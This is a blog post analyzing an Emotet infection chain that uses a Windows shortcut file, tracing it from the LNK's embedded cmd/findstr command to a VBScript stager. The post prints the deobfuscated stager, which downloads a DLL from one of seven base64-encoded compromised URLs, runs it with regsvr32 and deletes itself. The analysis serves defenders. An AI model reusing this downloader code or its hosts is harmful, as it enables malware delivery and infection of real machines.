<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Shortcut to Emotet, an odd TTP change" /><meta property="og:locale" content="en" /><meta name="description" content="The adversary behind Emotet made a really interesting TTP change around 4/22 to use Windows shortcut files, and it definitely got noticed by multiple researchers." /><meta property="og:description" content="The adversary behind Emotet made a really interesting TTP change around 4/22 to use Windows shortcut files, and it definitely got noticed by multiple researchers." /><link rel="canonical" href="https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/" /><meta property="og:url" content="https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-24T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Shortcut to Emotet, an odd TTP change" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-24T00:00:00+00:00","datePublished":"2022-04-24T00:00:00+00:00","description":"The adversary behind Emotet made a really interesting TTP change around 4/22 to use Windows shortcut files, and it definitely got noticed by multiple researchers.","headline":"Shortcut to Emotet, an odd TTP change","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/"},"url":"https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/"}</script><title>Shortcut to Emotet, an odd TTP change | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Shortcut to Emotet, an odd TTP change</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Shortcut to Emotet, an odd TTP change</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1650758400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-24 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1995 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p>The adversary behind Emotet made a really interesting TTP change around 4/22 to use Windows shortcut files, and it definitely got noticed by multiple researchers.</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/Emotet?src=hash&amp;ref_src=twsrc%5Etfw">#Emotet</a> New TTPs üö®<br /><br />[+] LNK with embedded VBScript<br /><br />[+] VBS stager:<br />- Base64 encoded URLs X7<br />- ServerXMLHTTP download Emotet &gt; %TMP%<br />- Exec with regsvr32<br />- VBS file removed after the exec<br /><br />LNK &gt; CMD &gt; findstr &amp; Wscript &gt; Regsvr32 &gt; Regsvr32<br /><br />C2 server: 138.201.142[.]73:8080üî• <a href="https://t.co/DHGHAMiAPX">https://t.co/DHGHAMiAPX</a> <a href="https://t.co/0ans5nyI79">pic.twitter.com/0ans5nyI79</a></p>&mdash; Max_Malyutin (@Max_Mal_) <a href="https://twitter.com/Max_Mal_/status/1517851293905297408?ref_src=twsrc%5Etfw">April 23, 2022</a></blockquote><script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><blockquote class="twitter-tweet"><p lang="en" dir="ltr">2022-04-22 (Friday) - <a href="https://twitter.com/hashtag/Emotet?src=hash&amp;ref_src=twsrc%5Etfw">#Emotet</a> <a href="https://twitter.com/hashtag/epoch4?src=hash&amp;ref_src=twsrc%5Etfw">#epoch4</a> malspam sent zipped Windows shorcut (.LNK). LNK didn&#39;t work in my lab or online sandboxes. But the shortcut contains script that I copied into a .vbs file, which ran fine. LNK: <a href="https://t.co/zfiDZytclb">https://t.co/zfiDZytclb</a> VBS: <a href="https://t.co/PMKUrA7RIn">https://t.co/PMKUrA7RIn</a> <a href="https://t.co/XiNbazHeY1">pic.twitter.com/XiNbazHeY1</a></p>&mdash; Brad (@malware_traffic) <a href="https://twitter.com/malware_traffic/status/1517622327000846338?ref_src=twsrc%5Etfw">April 22, 2022</a></blockquote><script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>This TTP change is a bit odd but not entirely unexpected with Emotet. Since returning earlier in the year, the adversary behind Emotet has spent a significant amount of time experimenting with different deployment techniques until settling on Excel 4.0 macros. Previous iterations also explored <a href="https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/">APPX</a> packages, experiments with PowerShell, and more. There‚Äôs no way to know if this TTP change will stay as part of Emotet‚Äôs rotation, but if it does it will help to understand how it works. In this post I want to walk through the latest change using the sample available in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/082d5935271abf58419fb5e9de83996bd2f840152de595afa7d08e4b98b1d203/">https://bazaar.abuse.ch/sample/082d5935271abf58419fb5e9de83996bd2f840152de595afa7d08e4b98b1d203/</a>.</p><h2 id="triaging-the-shortcut"><span class="mr-2">Triaging the shortcut</span><a href="#triaging-the-shortcut" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can easily get the first few details from the shortcut using a combination of <code class="language-plaintext highlighter-rouge">diec</code>, <code class="language-plaintext highlighter-rouge">file</code>, and <code class="language-plaintext highlighter-rouge">exiftool</code>. First, let‚Äôs confirm the shortcut is indeed a shortcut.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>file INV<span class="se">\ </span>2022-04-22_1538<span class="se">\,\ </span>US.doc.lnk 
<span class="go">INV 2022-04-22_1538, US.doc.lnk: MS Windows shortcut, Item id list present, Has Relative path, Has command line arguments, Icon number=134, ctime=Mon Jan  1 04:56:02 1601, mtime=Mon Jan  1 04:56:02 1601, atime=Mon Jan  1 04:56:02 1601, length=0, window=hide

</span><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>diec INV<span class="se">\ </span>2022-04-22_1538<span class="se">\,\ </span>US.doc.lnk 
<span class="go">Binary
    Format: Windows Shortcut (.LNK)
</span></pre></table></code></div></div><p>It looks like both <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">diec</code> agree that we‚Äôre looking at a MS Windows LNK shortcut file. Now let‚Äôs parse that metadata using <code class="language-plaintext highlighter-rouge">exiftool</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>exiftool INV<span class="se">\ </span>2022-04-22_1538<span class="se">\,\ </span>US.doc.lnk 
<span class="go">ExifTool Version Number         : 12.30
File Name                       : INV 2022-04-22_1538, US.doc.lnk
Directory                       : .
File Size                       : 3.6 KiB
File Modification Date/Time     : 2022:04:22 22:17:34-04:00
File Access Date/Time           : 2022:04:24 19:58:22-04:00
File Inode Change Date/Time     : 2022:04:24 19:56:34-04:00
File Permissions                : -rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, RelativePath, CommandArgs, IconFile, Unicode
File Attributes                 : (none)
Target File Size                : 0
Icon Index                      : 134
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : cmd.exe
Relative Path                   : ..\..\Windows\system32\cmd.exe
</span><span class="gp">Command Line Arguments          : /v:on /c findstr "rSIPPswjwCtKoZy.*" Password2.doc.lnk &gt;</span><span class="w"> </span><span class="s2">"%tmp%</span><span class="se">\V</span><span class="s2">EuIqlISMa.vbs"</span> &amp; <span class="s2">"%tmp%</span><span class="se">\V</span><span class="s2">EuIqlISMa.vbs"</span>
<span class="go">Icon File Name                  : shell32.dll
</span></pre></table></code></div></div><p>Looking at the metadata, we can piece together the command it‚Äôll execute by piecing together the Target File DOS Name and Command Line Arguments. Put together, it‚Äôll spawn this command:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Windows\system32\cmd.exe /v:on /c findstr "rSIPPswjwCtKoZy.*" Password2.doc.lnk &gt;</span><span class="w"> </span><span class="s2">"%tmp%</span><span class="se">\V</span><span class="s2">EuIqlISMa.vbs"</span> &amp; <span class="s2">"%tmp%</span><span class="se">\V</span><span class="s2">EuIqlISMa.vbs"</span>
</pre></table></code></div></div><p>That <code class="language-plaintext highlighter-rouge">cmd.exe</code> command will spawn from <code class="language-plaintext highlighter-rouge">explorer.exe</code> once the user clicks on the shortcut, execute a <code class="language-plaintext highlighter-rouge">findstr</code> to search a <code class="language-plaintext highlighter-rouge">Password2.doc.lnk</code> for a line that includes <code class="language-plaintext highlighter-rouge">rSIPPswjwCtKoZy</code>, writes that line of code to <code class="language-plaintext highlighter-rouge">VEuIqlISMa.vbs</code>, and then executes <code class="language-plaintext highlighter-rouge">VEuIqlISMa.vbs</code>.</p><blockquote class="prompt-info"><div><p>NOTE: As the LNK file is currently not named <code class="language-plaintext highlighter-rouge">Password2.doc.lnk</code>, the stage will not work. We‚Äôre going to continue analysis here under the assumption the adversary had gotten the naming to work properly.</p></div></blockquote><h2 id="analyzing-the-vbs"><span class="mr-2">Analyzing the VBS</span><a href="#analyzing-the-vbs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can manually get the VBS file ourselves using a <code class="language-plaintext highlighter-rouge">grep</code> command in REMnux.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-aF</span> <span class="s2">"rSIPPswjwCtKoZy"</span> INV<span class="se">\ </span>2022-04-22_1538<span class="se">\,\ </span>US.doc.lnk <span class="o">&gt;</span> VEuIqlISMa.vbs
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>file VEuIqlISMa.vbs 
<span class="go">VEuIqlISMa.vbs: ASCII text, with very long lines

</span><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>diec VEuIqlISMa.vbs 
<span class="go">Binary
    Format: plain text[LF]
</span></pre></table></code></div></div><p>We successfully exported the VBS! It‚Äôs all on one line initially, but once we clean it up we can get some findings. The first half of the script is below, and it contains some overhead code and the URLs needed for downloading code.</p><div file="VEuIqlISMa.vbs" class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="VEuIqlISMa.vbs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="n">rSIPPswjwCtKoZy</span><span class="o">=</span><span class="mi">1</span><span class="p">::</span>
<span class="n">on</span> <span class="n">error</span> <span class="n">resume</span> <span class="n">next</span><span class="p">:</span>
<span class="k">Set</span> <span class="n">FSO</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">)::</span>
<span class="k">Function</span> <span class="nf">Base64Decode</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">vCode</span><span class="p">):</span>    
<span class="k">With</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Msxml2.DOMDocument.3.0"</span><span class="p">).</span><span class="n">CreateElement</span><span class="p">(</span><span class="s">"base64"</span><span class="p">):</span>        
    <span class="p">.</span><span class="n">dataType</span> <span class="o">=</span> <span class="s">"bin.base64"</span><span class="p">:</span>        
    <span class="p">.</span><span class="n">text</span> <span class="o">=</span> <span class="n">vCode</span><span class="p">:</span>        
    <span class="n">Base64Decode</span> <span class="o">=</span> <span class="n">Stream_BinaryToString</span><span class="p">(.</span><span class="n">nodeTypedValue</span><span class="p">):</span>    
<span class="k">End</span> <span class="k">With</span><span class="p">:</span>
<span class="k">End</span> <span class="k">Function</span><span class="p">::</span>

<span class="k">Function</span> <span class="nf">Stream_BinaryToString</span><span class="p">(</span><span class="n">Binary</span><span class="p">):</span>    
<span class="k">With</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"ADODB.Stream"</span><span class="p">):</span>        
    <span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">:</span>        
    <span class="p">.</span><span class="n">Open</span><span class="p">:</span>        
    <span class="p">.</span><span class="n">Write</span> 
    <span class="n">Binary</span><span class="p">:</span>        
    <span class="p">.</span><span class="n">Position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">:</span>        
    <span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">2</span><span class="p">:</span>        
    <span class="p">.</span><span class="n">CharSet</span> <span class="o">=</span> <span class="s">"utf-8"</span><span class="p">:</span>        
    <span class="n">Stream_BinaryToString</span> <span class="o">=</span> <span class="p">.</span><span class="n">ReadText</span><span class="p">:</span>    
<span class="k">End</span> <span class="k">With</span><span class="p">:</span>
<span class="k">End</span> <span class="k">Function</span><span class="p">::</span>

<span class="k">Dim</span> <span class="nv">JOCItJMMrs</span><span class="p">(</span><span class="mi">7</span><span class="p">):::</span>
<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cDovL2Z0cC5jaXBsYWZlLmNvbS5ici9BTFQvM3dkQllKZXBSVi8="</span><span class="p">::</span>
<span class="c1">' hxxp://ftp.ciplafe.com[.]br/ALT/3wdBYJepRV/</span>

<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cHM6Ly9iZW5jZXZlbmRlZ2hhei5odS93cC1pbmNsdWRlcy85MHZsc1lXNUpJalov"</span><span class="p">::</span>
<span class="c1">' hxxps://bencevendeghaz[.]hu/wp-includes/90vlsYW5JIjZ/</span>

<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cDovL2V6bmV0Yi5zeW5vbG9neS5tZS9AZWFEaXIvd2cyQnFhV0ZSWmIxRy8="</span><span class="p">::</span>
<span class="c1">' hxxp://eznetb.synology[.]me/@eaDir/wg2BqaWFRZb1G/</span>

<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cHM6Ly93d3cucmVuZWV0dGVuLm5sL2NvbnRhY3QtZm9ybXVsaWVyL3R2ekFUbkltRk1OZjIwcmM3Lw=="</span><span class="p">::</span>
<span class="c1">' hxxps://www.reneetten[.]nl/contact-formulier/tvzATnImFMNf20rc7/</span>

<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cDovL2Rhcmtzd29yZC5ubC9hd3N0YXRzL1pxVm5VNW9sLw=="</span><span class="p">::</span>
<span class="c1">' hxxp://darksword[.]nl/awstats/ZqVnU5ol/</span>

<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cDovL2RhY2VudGVjMi5sYXllcmVkc2VydmVyLmNvbS9zcGVlZHRlc3QvV2RKelFSRTlHaHZzLw=="</span><span class="p">::</span>
<span class="c1">' hxxp://dacentec2.layeredserver[.]com/speedtest/WdJzQRE9Ghvs/</span>

<span class="n">JOCItJMMrs</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">=</span> <span class="s">"aHR0cDovL3ZpcC1jbGluaWMucmF6cmFib3RrYS5ieS9hYm91dF9jZW50ZXIvTE10QlRjTEgwcEgxb1BoaTkv"</span><span class="p">:::</span>
<span class="c1">' hxxp://vip-clinic.razrabotka[.]by/about_center/LMtBTcLH0pH1oPhi9/</span>
</pre></table></code></div></div><p>The first two functions are overhead/utility functions to perform encoding conversions. The chunk of code manipulating <code class="language-plaintext highlighter-rouge">JOCItJMMrs(7)</code> creates an array that contains all the Emotet download URLs. These URLs are base64 encoded and you can readily decode them using CyberChef or <code class="language-plaintext highlighter-rouge">base64 -d</code> commands in REMnux. The second half of the script contains some obfuscation in the form of string splitting and character to decimal conversion. Once we get that reduced, it‚Äôll look something like this:</p><div file="VEuIqlISMa.vbs" class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="VEuIqlISMa.vbs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="n">Execute</span><span class="p">(</span>
    <span class="s">"Dim Xml,WS,DB,FilepatH,URL:
    Xml = MSXML2.SErverXmlHtTP.3.0:
    WS = </span><span class="se">""</span><span class="s">WsCript.SHELl:
    dB = </span><span class="se">""</span><span class="s">adoDb.strEAM</span><span class="se">""</span><span class="s">:
    Set SblpfvbXdq = CREATEOBJECT(WS):
    tMP = sblpfvBXDQ.EXpAnDEnvironmentStRIngS(</span><span class="se">""</span><span class="s">%TmP%</span><span class="se">""</span><span class="s">):
    WIndiR = SbLPFvBxdQ.expandenviroNmEntstRINgs(</span><span class="se">""</span><span class="s">%WINdir%</span><span class="se">""</span><span class="s">) ::
    filEpaTH = Tmp &amp; </span><span class="se">""</span><span class="s">\VMtbfGSBow.QsJ</span><span class="se">""</span><span class="s">:::
    cAll prog:
    SUb prog:
        RANDoMIzE:
        indeX = int((6 - 0 + 1)*Rnd + 0):
        dIm MsxMl:
    Set MsXmL = crEAteoBJEct(Xml):
        diM sTreaM:
    seT STReaM = CrEATEObjEct(dB):
        MsXmL.opeN gEt, Base64DecOde(JocITjmMrS(iNDex)), fALSE:
        MsXmL.setreqUEsthEaDER USer-agEnT, kykwTJBDAyBKqLonrjjG:
        MsXMl.senD:
        wIth stReAm:
            .tyPe = 1:
            .open:
        .WRite MsXMl.resPONseboDy:
        .saVetofilE FilEPath, 2:
        end wiTh:
    EnD SUB"</span><span class="p">)::</span>
<span class="n">SBLpFvbXDQ</span><span class="p">.</span><span class="n">Exec</span><span class="p">(</span><span class="n">windir</span> <span class="o">&amp;</span> <span class="s">"\System32\regsvR32.ExE "</span> <span class="o">&amp;</span> <span class="n">tmp</span> <span class="o">&amp;</span> <span class="n">Base64Decode</span><span class="p">(</span><span class="s">"XHZtVGJmR1NCT1cucXNq"</span><span class="p">)):</span>
<span class="c1">' \vmTbfGSBOW.qsj</span>
<span class="n">FSO</span><span class="p">.</span><span class="n">GetFile</span><span class="p">(</span><span class="n">WScript</span><span class="p">.</span><span class="n">ScriptFullName</span><span class="p">).</span><span class="n">delete</span>
</pre></table></code></div></div><p>This chunk of code takes VBScript pass into <code class="language-plaintext highlighter-rouge">Execute()</code> as a string and executes it. That code randomly picks an element of the <code class="language-plaintext highlighter-rouge">JocITjmMrS(7)</code> array, attempts to download content (presumably a DLL) from that URL to <code class="language-plaintext highlighter-rouge">vmTbfGSBOW.qsj</code>, and executes the downloaded content with <code class="language-plaintext highlighter-rouge">regsvr32.exe</code>. Afterward, the script deletes itself from disk. One very odd detail in this script is that the adversary chooses to specify a User-Agent string of <code class="language-plaintext highlighter-rouge">kykwTJBDAyBKqLonrjjG</code>. This may be something designed to gate access or keep track of statistics since UA strings can be arbitrary and optional.</p><p>To summarize so far:</p><ul><li><code class="language-plaintext highlighter-rouge">explorer.exe</code> spawns <code class="language-plaintext highlighter-rouge">cmd.exe</code> with the <code class="language-plaintext highlighter-rouge">findstr</code> command to write the VBS<li><code class="language-plaintext highlighter-rouge">cmd.exe</code> spawns <code class="language-plaintext highlighter-rouge">wscript.exe VEuIqlISMa.vbs</code><li><code class="language-plaintext highlighter-rouge">wscript.exe</code> contacts one of 7 URLs to download a DLL<li><code class="language-plaintext highlighter-rouge">wscript.exe</code> writes the DLL to <code class="language-plaintext highlighter-rouge">vmTbfGSBOW.qsj</code><li><code class="language-plaintext highlighter-rouge">wscript.exe</code> executes <code class="language-plaintext highlighter-rouge">regsvr32.exe vmTbfGSBOW.qsj</code><li><code class="language-plaintext highlighter-rouge">wscript.exe</code> removes <code class="language-plaintext highlighter-rouge">VEuIqlISMa.vbs</code> from disk</ul><h2 id="triage-the-downloaded-dll"><span class="mr-2">Triage the downloaded DLL</span><a href="#triage-the-downloaded-dll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>From here the threat converges to a traditional Emotet infection via DLL. Before I stop for the evening I still want to triage the DLL a bit and see if we can generate some hypotheses.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>file vmTbfGSBOW.qsj 
<span class="go">vmTbfGSBOW.qsj: PE32+ executable (DLL) (GUI) x86-64, for MS Windows

</span><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>diec vmTbfGSBOW.qsj 
<span class="go">PE64
    Library: MFC(-)[static]
    Compiler: Microsoft Visual C++(2005)[-]
    Linker: Microsoft Linker(8.0 or 11.0)[DLL64]
